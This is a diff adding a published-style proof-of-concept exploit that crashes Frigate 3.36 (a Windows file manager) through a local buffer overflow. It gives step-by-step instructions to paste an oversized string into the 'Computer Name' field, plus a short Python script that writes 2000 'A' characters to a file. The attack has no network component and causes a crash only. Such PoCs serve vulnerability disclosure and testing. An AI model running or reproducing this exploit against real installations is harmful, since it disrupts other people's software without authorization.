@@ -1,0 +1,26 @@
+# Exploit Title: Frigate 3.36 - Denial of Service (PoC) 
+# Date: 2020-04-05
+# Exploit Author: inter
+# Vendor Homepage: http://www.Frigate3.com/
+# Software Link Download: http://www.Frigate3.com/download/Frigate3_Std_v36.exe
+# Vulnerable Software: Firgate
+# Version: 3.36
+# Vulnerability Type: Denial of Service (DoS) Local
+# Tested on: Windows 7 Ultimate Service Pack 1 (64 bit - English)  
+
+#Steps to Produce the Crash:
+
+#   1.- Run python code: crash.py
+#   2.- Copy content to clipboard
+#   3.- Open "Frigate3.exe"
+#   4.- Go to "Disk" > Find Computer
+#   5.- Paste ClipBoard into the "Computer Name:" field
+#   6.- Click on OK
+#   7.- Crashed
+
+#Python "crash.py" Code:
+   
+buffer = "\x41" * 2000
+f = open ("Frigate.txt", "w")
+f.write(buffer)
+f.close()
